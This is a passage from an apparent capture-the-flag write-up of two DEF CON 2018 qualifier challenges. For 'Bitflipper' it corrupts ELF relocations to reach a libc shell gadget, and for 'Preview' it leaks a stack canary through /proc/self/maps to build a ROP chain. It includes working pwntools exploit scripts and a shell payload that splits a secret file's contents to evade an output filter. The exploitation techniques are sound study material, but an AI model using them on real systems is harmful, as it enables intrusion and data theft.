</span></span><span class=line><span class=cl>                    <span class=n>resp</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;Go</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>resp</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=s2>&#34;Executed stuff &#34;</span><span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>currentMagic</span><span class=p>)</span><span class=o>+</span> <span class=s2>&#34; : &#34;</span><span class=o>+</span> <span class=nb>repr</span><span class=p>(</span><span class=n>resp</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=s2>&#34;EOF&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span></code></pre></div><h2 class="relative group">Bitflipper<div id=bitflipper class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#bitflipper aria-label=Anchor>#</a></span></h2><p>Type: reverse-ish, flag value: 177pt. Served at <code>61421a06.quals2018.oooverflow.io:5566</code>.</p><h3 class="relative group">The wrapper<div id=the-wrapper class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-wrapper aria-label=Anchor>#</a></span></h3><p>We are given access to a server that runs a packed ELF x86-64 program. Before running the binary, it tells us:</p><pre><code>-------------------------------------------------------
  Bitflipper - ELF Fault Injection Framework
-------------------------------------------------------
Test program md5:  30acc4aee186d6aef8e9e2036008a710
-------------------------------------------------------
How many faults you want to introduce?
</code></pre><p>The wrapper gives us the possibility to <em>&ldquo;introduce faults&rdquo;</em> in the binary before it is run, which means flipping between 0 and 4 bits (at whichever offset we like) in the binary. It also gives us the MD5 hash of the file, which will be helpful to us later to make some checks.</p><p>Answering <em>&ldquo;0&rdquo;</em> for the number of faults to add will make the wrapper run the program without modifying it, giving us its normal output:</p><pre><code>How many faults you want to introduce? 0
Alright, you are the boss.
Here is the output of the original program...
-------------------------------------------------------
README
abc.jpg
archive.zip
beta.doc
celtic.png
dir
secret_flag.txt
test.doc
version.txt
</code></pre><p>Interesting&mldr; we have a <code>secret_flag.txt</code> in the current folder.</p><p>Answering a number <code>n</code> between 1 and 4 will, on the other hand, make the wrapper ask for <code>n</code> offsets of the <code>n</code> bits which are going to be flipped:</p><pre><code>How many faults you want to introduce? 2
That sounds like a good number
Which bit do you want to flip (0-81727)? 1337
Which bit do you want to flip (0-81727)? 31337
2 bits have been flipped
MD5 of the new version: 7b41910eb8c1512fa5e8f97f203ba58e
Let me run the program for you now...
</code></pre><p>We are given the MD5 hash of the modified file, then the wrapper tries to run it and give us the output. Fiddling around with the offsets of the bits to flip <strong>we are very easily able to &ldquo;break&rdquo; the binary</strong>. We can, for example: <strong>corrupt the ELF header</strong>, make it go into segmentation fault, <strong>tamper with symbol relocations</strong>, trigger a double <code>free()</code> causing a vmmap dump and backtrace, and so on.</p><p>Making the program crash will cause the wrapper to send us an <strong>important hint</strong>:</p><pre><code>Looks like you broke it!
I would send you a core dump, but I could not find any in the current directory
</code></pre><p>Cool! This means that if we manage to <strong>flip some bits in the ELF header to make it become an <em>ELF core file</em>, the server will send us the entire binary</strong>!</p><p>Indeed, flipping bits <code>128</code>, <code>129</code> and <code>130</code>, changing the byte at offset <code>0x10</code> from <code>0x03</code> to <code>0x04</code>, works just fine! Now we have a binary we can disassemble and begin to work on.</p><h3 class="relative group">The binary<div id=the-binary class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-binary aria-label=Anchor>#</a></span></h3><p>By computing the MD5 hash of the file we just got from the server we can verify that it is indeed the same binary which is run by the wrapper server-side. Moreover, we can now try out various combinations of bit flips and check the new local MD5 with the remote MD5 to check if we correctly flipped the bits.</p><p>The program itself is not really interesting: it outputs a simple sorted list of the files in the current folder coloring their name using ANSI escape codes. What is interesting is that by crashing the binary with a double <code>free()</code> we can get a vmmap dump from which we can find out the <code>libc</code> version being used:</p><pre><code>...
7ff226ddb000-7ff226f9b000 r-xp 00000000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so
7ff226f9b000-7ff22719b000 ---p 001c0000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so
7ff22719b000-7ff22719f000 r--p 001c0000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so
7ff22719f000-7ff2271a1000 rw-p 001c4000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so
...
</code></pre><p>We now know that it is using <code>libc-2.23</code>, and we assume the distro is, as usual, Ubuntu 16.04.4 LTS (Xenial Xerus).</p><h3 class="relative group">The exploit<div id=the-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-exploit aria-label=Anchor>#</a></span></h3><p>Now, getting into the real exploit: as said earlier, since we can modify up to four bits at arbitrary locations in the file, if precisely calculated, <strong>we can corrupt an <code>Elf64_Rela</code> structure in the PLT relocation table</strong> (<code>.rela.plt</code>) to trick the loader into writing the address of the specified symbol to an address (<code>r_offset</code>) in the GOT PLT (<code>.plt.got</code>), and, most importantly, adding a given offset (<code>r_addend</code>) to the absolute address (in the <code>libc</code>).</p><p>The <code>Elf64_Rela</code> struct is defined like this:</p><pre><code>typedef struct {
    Elf64_Addr      r_offset;
    Elf64_Xword     r_info;
    Elf64_Sxword    r_addend;
} Elf64_Rela;
</code></pre><p>We now have three different approaches to modify the execution flow of the program to fullfill our objective (which is obviously to execute a shell):</p><ol><li><p><strong>Modify the index of a symbol</strong> moving one of the functions used by the binary in another position in the PLT so that the program would call a different function instead of the expected one. Changing <code>r_offset</code> could also be possible, but harder to manage. This was not of great help since the binary doesn&rsquo;t use interesting functions (like <code>system</code> or similars).</p></li><li><p><strong>Modify <code>r_addend</code></strong> making the loader load a different function in the GOT (if it is close enough the original one). This was again not the case, since all of the &ldquo;cool&rdquo; <code>libc</code> functions (<code>system</code>, <code>execve</code>, <code>popen</code>, &mldr;) were either too far or unreachable flipping only 4 bits of <code>r_addend</code> (i.e. setting only four bits to <code>1</code>).</p></li><li><p><strong>Any combination of the first two</strong>: applying both of the above modifications for a symbol, so that calling a specific function would result in jumping in a different PLT entry than the expected one, and following the GOT entry of the latter would cause to call a totally different <code>libc</code> function than the original.</p></li></ol><p>To help us identify which function could have been replaced with wich, we wrote an helper script which did the maths for us. An example output filtered with <code>grep execv</code> is the following (the full list was actually more than 2000 lines):</p><pre><code>readdir  execv  0xcc860     0b100010001000000   0 3
closedir execvp 0xccbc0     0b100100000000000   0 2
closedir execvp 0xccbc0     0b100100000000001   1 3
closedir execvp 0xccbc0     0b100100000000010   2 3
closedir execvp 0xccbc0     0b100100000000100   4 3
closedir execvp 0xccbc0     0b100100000001000   8 3
strlen  fexecve 0xcc7a0 0b1000001000010000000   0 3
strlen  execve  0xcc770 0b1000001000001000000 -16 3
</code></pre><p>Unfortunately none of the functions reachable by tampering an <code>Elf64_Rela</code> structure were useful, since most of them were just random and useless &ldquo;normal&rdquo; functions, and the few interesting ones (like <code>exec{l,ve,vpe}</code>) were reachable but would have ended up being called with the wrong arguments.</p><p>We finally ran <a href=https://github.com/david942j/one_gadget target=_blank><code>one_gadget</code></a> on the <code>libc-2.23</code> binary, discovered four useful gedgets to run <code>execve('/bin/sh', NULL, NULL)</code> and added their address to the input of our script: three of them were completely out of range of the possible addresses that we could make the loader write into GOT, but one was close enough:</p><pre><code>opendir gadget4 0xf1147 0b101001000000000000 -7 3
</code></pre><p>which was:</p><pre><code>f1147: 48 8b 05 6a 2d 2d 00    mov    rax,QWORD PTR [rip+0x2d2d6a] # 3c3eb8 &lt;__environ@@GLIBC_2.2.5-0x3080&gt;
f114e: 48 8d 74 24 70          lea    rsi,[rsp+0x70]
f1153: 48 8d 3d fd bb 09 00    lea    rdi,[rip+0x9bbfd]            # 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;
f115a: 48 8b 10                mov    rdx,QWORD PTR [rax]
f115d: e8 0e b6 fd ff          call   cc770 &lt;execve@@GLIBC_2.2.5&gt;
</code></pre><p>This gadget executes <code>execve("/bin/sh", rsp+0x70, environ)</code>, so we actually would need <code>rsp+0x70</code> to be <code>NULL</code> to be sure to not get a <code>SIGSEGV</code> or to not call <code>/bin/sh some_garbage_args</code>, but it was well worth a try: using the third approach explained above, <strong>we can modify the <code>Elf64_Rela</code> struct of the <code>opendir</code> symbol</strong> (by flipping the bits <code>0x7fa*8 +1</code>, <code>+4</code> and <code>+7</code>), <strong>and make the program jump 7 bytes before the gadget</strong> (specifically at <code>libc_base + 0xf1140</code>) when the tampered <code>opendir</code> function gets called.</p><p>Jumping at <code>0xf1140</code> shuffles the cards in the deck a little bit, but it really isn&rsquo;t a problem:</p><pre><code>f1140: 24 60                   and    al,0x60
f1142: e8 99 67 00 00          call   f78e0 &lt;__close@@GLIBC_2.2.5&gt;
f1147: 48 8b 05 6a 2d 2d 00    mov    rax,QWORD PTR [rip+0x2d2d6a] # 3c3eb8 &lt;__environ@@GLIBC_2.2.5-0x3080&gt;
...
</code></pre><p>As you can see, before the gedget there&rsquo;s a dirty little <code>mov al,0x60</code>, but we don&rsquo;t care about it because we have a <code>mov rax, &lt;stuff></code> right after wich resets <code>rax</code>, and also a call to <code>__close@@GLIBC_2.2.5</code>: this call could actually do something unexpected.</p><p>Anyway, running the exploit locally gave us a functioning shell, so we ran it remotely, and&mldr; the server hangs waiting for input, <strong>success!</strong> Well, actually not really: no output was being sent back to us because the call to <code>__close</code> was closing <code>stdout</code> right before executing the shell. Not a problem, we still have <code>stderr</code>! Now, since the remote shell is <code>dash</code>, we first ran <code>bash</code> and then tried to run <code>cat secret_flag.txt >&amp;2</code>, followed by two <code>exit</code>. The wrapper complained: it had detected that we were trying to get the content of a local file and blocked us. To circumvent this check we just put the content of the flag in a local variable and used <code>echo</code> to write its content splitted in three parts:</p><pre><code>FLAG=$(cat secret_flag.txt)
echo ${FLAG:0:5} &gt;&amp;2
echo ${FLAG:5:5} &gt;&amp;2
echo ${FLAG:10:5} &gt;&amp;2
</code></pre><p><strong>Ta da! Got the flag!</strong> Here&rsquo;s the final output of our exploit:</p><pre><code>$ ./expl.py
[+] Opening connection to 61421a06.quals2018.oooverflow.io on port 5566: Done
[+] Solving proof of work: done (359477).
[*] Flipping bits: 0x3fcc, 0x3fcf, 0x3fd1
[*] Waiting for shell to run...
[*] Sending payload: FLAG=$(cat secret_flag.txt)
    echo ${FLAG:0:5} &gt;&amp;2
    echo ${FLAG:5:5} &gt;&amp;2
    echo ${FLAG:10:5} &gt;&amp;2
[+] Receiving all data: Done (251B)
[*] Closed connection to 61421a06.quals2018.oooverflow.io port 5566

3 bits have been flipped
MD5 of the new version: 3e126b5008b69f13559c49657a15f5fa
Let me run the program for you now...
-------------------------------------------------------
bitfl
ip_ma
dness

-------------------------------------------------------

[+] Gottem!
</code></pre><p>Flag: <code>bitflip_madness</code>.</p><h3 class="relative group">Code<div id=code class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#code aria-label=Anchor>#</a></span></h3><p>Code of the exploit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>__future__</span> <span class=kn>import</span> <span class=n>print_function</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>time</span> <span class=kn>import</span> <span class=n>sleep</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>challenge</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>solution</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>%</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>n</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>candidate</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=ow>not</span> <span class=n>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>candidate</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>candidate</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>candidate</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>connect_and_solve_pow</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;61421a06.quals2018.oooverflow.io&#39;</span><span class=p>,</span> <span class=mi>5566</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Challenge: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;n: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pow_progress</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Solving proof of work&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pow_progress</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=s1>&#39;hang tight...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sol</span> <span class=o>=</span> <span class=n>solve_pow</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pow_progress</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;done (</span><span class=si>%d</span><span class=s1>).&#39;</span><span class=p>,</span> <span class=n>sol</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>sol</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>conn</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BITS_TO_FLIP</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x7f9</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=mi>4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x7f9</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=mi>7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x7fa</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;FLAG=$(cat secret_flag.txt)
</span></span></span><span class=line><span class=cl><span class=s2>echo ${FLAG:0:5} &gt;&amp;2
</span></span></span><span class=line><span class=cl><span class=s2>echo ${FLAG:5:5} &gt;&amp;2
</span></span></span><span class=line><span class=cl><span class=s2>echo ${FLAG:10:5} &gt;&amp;2
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>connect_and_solve_pow</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Flipping bits: </span><span class=si>%s</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;, &#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>hex</span><span class=p>,</span> <span class=n>BITS_TO_FLIP</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;introduce? &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>BITS_TO_FLIP</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>BITS_TO_FLIP</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;(0-81727)? &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>b</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Waiting for shell to run...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Sending payload: </span><span class=si>%s</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>PAYLOAD</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;bash&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>PAYLOAD</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;exit&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;exit&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>output</span><span class=p>,</span> <span class=n>sep</span><span class=o>=</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;Gottem!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><h2 class="relative group">Ddtek: Preview<div id=ddtek-preview class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#ddtek-preview aria-label=Anchor>#</a></span></h2><p>The challenge presents us with the &ldquo;preview&rdquo; binary and the <code>libc.so.6</code> file.
The binary allow us to view the first 7 lines of any file specified in the
input with the format &ldquo;HEAD filename&rdquo;, if the file has less than 7 lines, it
will not be printed. That means the flag file is not accessible.</p><p>A quick look at the binary in ida, reveals us that the file is behaving like
an unpacker, it loads ld.so.2 at a random address and makes it load the main
binary in another random address. Furthermore we can see that the main
function has a clear stack overflow. But the binary has the canary&mldr;</p><p>Examining the unpacked behavior we see that the random position where the
binary loads are taken from the <code>AT_RANDOM</code> entry of the auxiliary vector. So
if we know where the program is loaded we leak also the canary, since the
loader takes the canary value from the very same bytes.</p><p>After some thinking we found that the binary let&rsquo;s us read <code>/proc/self/maps</code>:
BINGO! Fortunately the first seven entries printed match with the address of
the binary and ld, that combined correspond with the canary. Now
OVERFLOW+CANARY+PAD+ROPCHAIN_ON_LD gives us the desired shell!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>pack</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s1>&#39;cee810fa.quals2018.oooverflow.io&#39;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span>  <span class=mi>31337</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>challenge</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>solution</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>%</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>n</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>candidate</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>candidate</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>candidate</span>
</span></span><span class=line><span class=cl>        <span class=n>candidate</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>connect</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>conn</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Challenge: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>challenge</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;n: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>solution</span> <span class=o>=</span> <span class=n>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>solution</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>connect</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;HEAD /proc/self/maps&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;preview:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
